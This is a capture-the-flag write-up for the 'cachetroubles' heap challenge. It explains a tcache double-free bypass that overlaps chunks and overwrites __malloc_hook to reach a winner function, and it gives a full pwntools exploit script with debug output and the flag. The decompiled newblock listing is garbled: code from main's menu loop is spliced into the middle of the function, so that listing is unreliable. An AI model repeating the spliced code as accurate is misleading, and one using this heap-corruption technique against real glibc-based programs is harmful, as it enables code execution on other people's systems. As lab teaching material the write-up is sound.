# Writeup
We are given a binary to pwn, with all security features enabled.
```
$ checksec --file=cachetroubles
[*] '/pctf/cachetroubles'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Executing it, we are given two addresses:
```
$ ./cachetroubles
If you wanna win, winner's at: 0x5571471cc42d

What? That's not enough? Ok, here's another secret: 0x7f3b3f2f2e50

1. Allocate
2. Delete
3. Exit
>
```
Then we are presented with a menu with minimal functionality - we can allocate something, or delete something.
Disassembling `main` in gdb.
```
(gdb) disas main
Dump of assembler code for function main:
	....
   0x000000000000147e <+23>:    mov    DWORD PTR [rbp-0xc],0x1
   0x0000000000001485 <+30>:    lea    rsi,[rip+0xffffffffffffffa1]        # 0x142d <winner>
   0x000000000000148c <+37>:    lea    rdi,[rip+0xc0d]        # 0x20a0
   0x0000000000001493 <+44>:    mov    eax,0x0
   0x0000000000001498 <+49>:    call   0x1070 <printf@plt>
   0x000000000000149d <+54>:    call   0x1080 <getchar@plt>
   0x00000000000014a2 <+59>:    mov    rax,QWORD PTR [rip+0x2b2f]        # 0x3fd8
   0x00000000000014a9 <+66>:    mov    rsi,rax
   0x00000000000014ac <+69>:    lea    rdi,[rip+0xc15]        # 0x20c8
   0x00000000000014b3 <+76>:    mov    eax,0x0
   0x00000000000014b8 <+81>:    call   0x1070 <printf@plt>
   0x00000000000014bd <+86>:    call   0x1080 <getchar@plt>
   0x00000000000014c2 <+91>:    jmp    0x1543 <main+220>
   0x00000000000014c4 <+93>:    lea    rcx,[rip+0xc35]        # 0x2100
   0x00000000000014cb <+100>:   lea    rdx,[rip+0xc36]        # 0x2108
   0x00000000000014d2 <+107>:   lea    rsi,[rip+0xc39]        # 0x2112
   0x00000000000014d9 <+114>:   lea    rdi,[rip+0xc3e]        # 0x211e
   0x00000000000014e0 <+121>:   mov    eax,0x0
   0x00000000000014e5 <+126>:   call   0x1070 <printf@plt>
   0x00000000000014ea <+131>:   mov    rax,QWORD PTR [rip+0x2b2f]        # 0x4020 <stdout@GLIBC_2.2.5>
   0x00000000000014f1 <+138>:   mov    rdi,rax
   0x00000000000014f4 <+141>:   call   0x10a0 <fflush@plt>
   0x00000000000014f9 <+146>:   lea    rax,[rbp-0xc]
   0x00000000000014fd <+150>:   mov    rsi,rax
   0x0000000000001500 <+153>:   lea    rdi,[rip+0xb3c]        # 0x2043
   0x0000000000001507 <+160>:   mov    eax,0x0
   0x000000000000150c <+165>:   call   0x10b0 <__isoc99_scanf@plt>
   0x0000000000001511 <+170>:   mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000001514 <+173>:   cmp    eax,0x1
   0x0000000000001517 <+176>:   jne    0x1525 <main+190>
   0x0000000000001519 <+178>:   mov    eax,0x0
   0x000000000000151e <+183>:   call   0x11c5 <newblock>
   0x0000000000001523 <+188>:   jmp    0x1543 <main+220>
   0x0000000000001525 <+190>:   mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000001528 <+193>:   cmp    eax,0x2
   0x000000000000152b <+196>:   jne    0x1539 <main+210>
   0x000000000000152d <+198>:   mov    eax,0x0
   0x0000000000001532 <+203>:   call   0x1366 <delete>
   0x0000000000001537 <+208>:   jmp    0x1543 <main+220>
   0x0000000000001539 <+210>:   mov    edi,0x0
   0x000000000000153e <+215>:   call   0x10c0 <exit@plt>
   0x0000000000001543 <+220>:   mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000001546 <+223>:   test   eax,eax
   0x0000000000001548 <+225>:   jle    0x1556 <main+239>
   0x000000000000154a <+227>:   mov    eax,DWORD PTR [rbp-0xc]
   0x000000000000154d <+230>:   cmp    eax,0x3
   0x0000000000001550 <+233>:   jle    0x14c4 <main+93>
   0x0000000000001556 <+239>:   mov    eax,0x0
   0x000000000000155b <+244>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000000155f <+248>:   sub    rdx,QWORD PTR fs:0x28
   0x0000000000001568 <+257>:   je     0x156f <main+264>
   0x000000000000156a <+259>:   call   0x1060 <__stack_chk_fail@plt>
   0x000000000000156f <+264>:   leave
   0x0000000000001570 <+265>:   ret
End of assembler dump.
```
We can see that it calls a function `newblock` when we choose Allocate, and another function delete when we call `delete`.
In the disassembly of `newblock`, we can see a call to `malloc`. This is a heap based challenge.
To make life easier, let's decompile the binary using Ghidra.
In `main`, we can see that the `secret` given to us, is in fact a libc address. Specifically, `system`.
```c
int main(void) {
  ...
  printf("If you wanna win, winner\'s at: %p\n",winner);
  getchar();
  printf("What? That\'s not enough? Ok, here\'s another secret: %p\n",system);
  getchar();
  ...
  return 0;
}
```
Great, so now we have the address of the function which we eventually want to call, and also a libc function address to defeat ASLR!
But we can't overwrite GOT entries because of Full RELRO.
We need to examine `newblock`
```c
void newblock(void) {
  void *pvVar1;
  long in_FS_OFFSET;
  int local_224;
  int local_220;
  int local_21c;
  char local_218 [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_220 = -1;
  local_21c = 0;
  while ((local_21c < 0xf && (local_220 == -1))) {
    if (*(long *)(blocks + (long)local_21c * 8) == 0) {
      local_220 = local_21c;
    }while ((0 < local_14 && (local_14 < 4))) {
    printf("%s\n%s\n%s\n>","1. Allocate","2. Delete","3. Exit");
    fflush(stdout);
    __isoc99_scanf(&DAT_00102043,&local_14);
    if (local_14 == 1) {
      newblock();
    }
    else {
      if (local_14 != 2) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      delete();
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }

    local_21c = local_21c + 1;
  }
  if (local_220 == -1) {
    puts("All blocks full...");
  }
  else {
    local_224 = 0;
    printf("%s>","Enter the size of the contents");
    fflush(stdout);
    __isoc99_scanf(&DAT_00102043,&local_224);
    pvVar1 = malloc((long)(local_224 + 1));
    *(void **)(blocks + (long)local_220 * 8) = pvVar1;
    printf("%s>","Enter the contents");
    fflush(stdout);
    __isoc99_scanf("%512s",local_218);
    local_218[local_224] = '\0';
    strcpy(*(char **)(blocks + (long)local_220 * 8),local_218);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
The first `while` loop searches for an index in a global array `blocks` for a non-NULL entry. We can infer that our blocks are allocated through pointers maintained in this array. The loop fails after checking 15 entries, so we can have upto 15 blocks.

We are asked for a size, which is read into a buffer `(char local_218 [520])`, using `scanf("%512s")`. So we can enter upto 512 characters, which is `strcpy`'d into the `malloc`'d memory, and the NULL character is also set in the buffer before copying.
So far there doesn't seem to be any vulnerability.
We go ahead and examine `delete`.
```c
void delete(void) {
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("%s>","Enter the index(0-19):");
  fflush(stdout);
  __isoc99_scanf(&DAT_00102043,&local_14);
  if (((local_14 < 0) || (0xf < local_14)) || (*(long *)(blocks + (long)local_14 * 8) == 0)) {
    puts("Invalid Index...");
  }
  else {
    free(*(void **)(blocks + (long)local_14 * 8));
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
We are asked for an index to `free`, and it is `free`'d if it is non NULL.
However, in the `else` part, we can see that the pointer is `free`'d, but not zeroed out!
So.. do we have a double free?
```
$ ./cachetroubles
If you wanna win, winner's at: 0x5640f208842d

What? That's not enough? Ok, here's another secret: 0x7ff55b1e6e50

1. Allocate
2. Delete
3. Exit
>1
Enter the size of the contents>20
Enter the contents>AAAAAAAA
1. Allocate
2. Delete
3. Exit
>2
Enter the index(0-19):>0
1. Allocate
2. Delete
3. Exit
>2
Enter the index(0-19):>0
free(): double free detected in tcache 2
Aborted
```
Ah, it's been [patched](https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7)!
We can, however, bypass this.

The exploit is as follows:
- Fill a tcache bin by allocating and freeing 7 blocks
- Allocate two more blocks (prev and victim), and free them. They must go into the unsorted bin and consolidate.
- Allocate another block to create space for a block in the tcache
- free(victim) -- _double free_. victim is now in the tcache bin.
- Now victim is overlapping with a free'd chunk. Allocate that chunk from the unsorted bin and overwrite victim->fwd with `__malloc_hook`
- Allocate chunk with address of `winner`, and add another chunk
- Now `__malloc_hook` is overwritten with the address of `winner`, so calling `malloc` will call `winner`, and we have our flag!

Here's the exploit script.
```python
from pwn import *

binary = './cachetroubles'
context.log_level='debug'
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)
#helper functions to interact with the binary
def add(size, content):
    p.sendlineafter('>', '1')
    p.sendlineafter('>', str(size))
    p.sendlineafter('>', content)

def free(index):
    p.sendlineafter('>', '2')
    p.sendlineafter('>', str(index))
#initialize
p = process(binary)

#store addresses of winner and system
p.recvuntil('at: ')
winner = int(p.recvuntil('\n').decode().strip('\n'), 0)
p.sendline()
p.recvuntil('secret: ')
system = int(p.recvuntil('\n').decode().strip('\n'), 0)
libc.address = system - libc.symbols['system']
malloc_hook = libc.symbols['__malloc_hook']
p.sendline()

log.info('libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__malloc_hook:' + hex(malloc_hook))
log.info('winner: ' + hex(winner))

#allocate 7 blocks
for i in range(7):
    add(0x100, ('A'*10).encode())

#prev is index 7
add(0x100, 'prev'.encode())

#victim is index 8
add(0x100, 'victim'.encode())

#padding to prevent consolidation with top
add(0x10, 'padding'.encode())

#fill tcache
for i in range(7):
    free(i)

#free victim and prev, consolidated in unsorted bin
free(8)
free(7)

#create space in tcache
add(0x100, 'BBBB'.encode())

#double free
free(8)
gdb.attach(p)
```
At this point, we can inspect the heap in gdb to make it clearer. It is convenient to use an extension like gef to inspect the heap.
```
gef➤  heap bins
──────────────────────────────── Tcachebins for arena 0x7f4d84353c40 ────────────────────────────────
Tcachebins[idx=15, size=0x110] count=7  ←  Chunk(addr=0x5621faec3f00, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x5621faec3bd0, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x5621faec3ac0, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x5621faec39b0, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x5621faec38a0, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x5621faec3790, size=0x110, flags=PREV_INUSE)  ←  Chunk(addr=0x5621faec3680, size=0x110, flags=PREV_INUSE) 
───────────────────────────────── Fastbins for arena 0x7f4d84353c40 ─────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────── Unsorted Bin for arena 'main_arena' ────────────────────────────────
[+] unsorted_bins[0]: fw=0x5621faec3de0, bk=0x5621faec3de0
 →   Chunk(addr=0x5621faec3df0, size=0x220, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
───────────────────────────────── Small Bins for arena 'main_arena' ─────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────── Large Bins for arena 'main_arena' ─────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```
```
gef➤  x/100wx 0x5621faec3de0 
0x5621faec3de0:	0x00000000	0x00000000	0x00000221	0x00000000
0x5621faec3df0:	0x84353ca0	0x00007f4d	0x84353ca0	0x00007f4d
0x5621faec3e00:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e10:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e20:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e30:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e40:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e50:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e60:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e70:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e80:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3e90:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3ea0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3eb0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3ec0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3ed0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3ee0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3ef0:	0x00000000	0x00000000	0x00000111	0x00000000
0x5621faec3f00:	0xfaec3bd0	0x00005621	0xfaec2010	0x00005621
0x5621faec3f10:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3f20:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3f30:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3f40:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3f50:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3f60:	0x00000000	0x00000000	0x00000000	0x00000000
```
Now, we allocate a chunk to overlap with our victim at 
`0x5621faec3ef0`, and overwrite it's `fwd` pointer with `__malloc_hook`.
```python
add(0x120, ('X' * 34 * 8).encode() + p64(malloc_hook))
gdb.attach(p)
```
```
gef➤  heap bins
──────────────────────────────── Tcachebins for arena 0x7f4d84353c40 ────────────────────────────────
Tcachebins[idx=15, size=0x110] count=7  ←  Chunk(addr=0x5621faec3f00, size=0x5858585858585858, flags=)  ←  Chunk(addr=0x7f4d84353c30, size=0x7f4d8421d010, flags=)
gef➤  x/100wx 0x5621faec3de0 
0x5621faec3de0:	0x00000000	0x00000000	0x00000131	0x00000000
0x5621faec3df0:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e00:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e10:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e20:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e30:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e40:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e50:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e60:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e70:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e80:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3e90:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3ea0:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3eb0:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3ec0:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3ed0:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3ee0:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3ef0:	0x58585858	0x58585858	0x58585858	0x58585858
0x5621faec3f00:	0x84353c30	0x00007f4d	0xfaec2010	0x00005621
0x5621faec3f10:	0x00000000	0x00000000	0x000000f1	0x00000000
0x5621faec3f20:	0x84353ca0	0x00007f4d	0x84353ca0	0x00007f4d
0x5621faec3f30:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3f40:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3f50:	0x00000000	0x00000000	0x00000000	0x00000000
0x5621faec3f60:	0x00000000	0x00000000	0x00000000	0x00000000 
```
And finally, we write the address of `winner` into `__malloc_hook`
```python
add(0x100, 'BBBB'.encode())
add(0x100, p64(winner))
gdb.attach(p)
```
```
gef➤  print winner
$2 = {<text variable, no debug info>} 0x5621f967942d <winner>
gef➤  search-pattern 0x5621f967942d
[+] Searching '\x2d\x94\x67\xf9\x21\x56' in memory
[+] In '[heap]'(0x5621faec2000-0x5621faee3000), permission=rw-
  0x5621faec2670 - 0x5621faec2688  →   "\x2d\x94\x67\xf9\x21\x56[...]" 
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.28.so'(0x7f4d84353000-0x7f4d84355000), permission=rw-
  0x7f4d84353c30 - 0x7f4d84353c48  →   "\x2d\x94\x67\xf9\x21\x56[...]" 
[+] In '[stack]'(0x7ffc8a6c0000-0x7ffc8a6e1000), permission=rw-
  0x7ffc8a6dfe80 - 0x7ffc8a6dfe98  →   "\x2d\x94\x67\xf9\x21\x56[...]"
```
We have successfully overwritten `__malloc_hook` in libc with the address of `winner`!
Now, we just need to call `malloc` by allocating another block.
Exploit output:
```
$ python3 exploit.py 
[*] '/pctf/cachetroubles'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './cachetroubles' argv=[b'./cachetroubles'] : pid 1802
[DEBUG] Received 0x2e bytes:
    b"If you wanna win, winner's at: 0x55b0d334842d\n"
[DEBUG] Sent 0x1 bytes:
    10 * 0x1
[DEBUG] Received 0x43 bytes:
    b"What? That's not enough? Ok, here's another secret: 0x7f9b511209c0\n"
[DEBUG] Sent 0x1 bytes:
    10 * 0x1
[*] libc base: 0x7f9b510dc000
[*] system: 0x7f9b511209c0
[*] __malloc_hook:0x7f9b51297c30
[*] winner: 0x55b0d334842d
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0xb bytes:
    b'AAAAAAAAAA\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0xb bytes:
    b'AAAAAAAAAA\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0xb bytes:
    b'AAAAAAAAAA\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0xb bytes:
    b'AAAAAAAAAA\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0xb bytes:
    b'AAAAAAAAAA\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0xb bytes:
    b'AAAAAAAAAA\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0xb bytes:
    b'AAAAAAAAAA\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0x5 bytes:
    b'prev\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0x7 bytes:
    b'victim\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x3 bytes:
    b'16\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0x8 bytes:
    b'padding\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'5\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'6\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'8\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'7\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0x5 bytes:
    b'BBBB\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x17 bytes:
    b'Enter the index(0-19):>'
[DEBUG] Sent 0x2 bytes:
    b'8\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'288\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0x119 bytes:
    00000000  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX│XXXX│XXXX│XXXX│
    *
    00000110  30 7c 29 51  9b 7f 00 00  0a                        │0|)Q│····│·│
    00000119
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0x5 bytes:
    b'BBBB\n'
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0x9 bytes:
    00000000  2d 84 34 d3  b0 55 00 00  0a                        │-·4·│·U··│·│
    00000009
[DEBUG] Received 0x1f bytes:
    b'1. Allocate\n'
    b'2. Delete\n'
    b'3. Exit\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1f bytes:
    b'Enter the size of the contents>'
[DEBUG] Sent 0x4 bytes:
    b'256\n'
[DEBUG] Received 0x19 bytes:
    b'pctf{h00k3d_70_7h3_h34p}\n'
[DEBUG] Received 0x13 bytes:
    b'Enter the contents>'
[DEBUG] Sent 0x5 bytes:
    b'CCCC\n'
```
